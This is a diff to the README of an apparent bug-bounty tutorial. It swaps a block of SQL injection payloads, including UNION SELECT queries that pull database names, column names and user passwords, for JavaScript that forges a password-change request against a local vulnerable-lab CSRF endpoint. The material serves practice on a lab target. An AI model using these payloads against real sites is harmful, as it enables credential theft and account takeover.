@@ -1,13 +1,12 @@
 # bug-bounty-tutorial
 bug bounty tutorial
 
-## 3.intro bug bounty
+## 8.CSRF-Advanced
+
+### low
 ```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
-
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
-
-1' OR 1=1 UNION SELECT user, password FROM users #
+const HttpRequest = new XMLHttpRequest();
+const url ="http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#";
+HttpRequest.open("GET", url);
+HttpRequest.send();
 ```
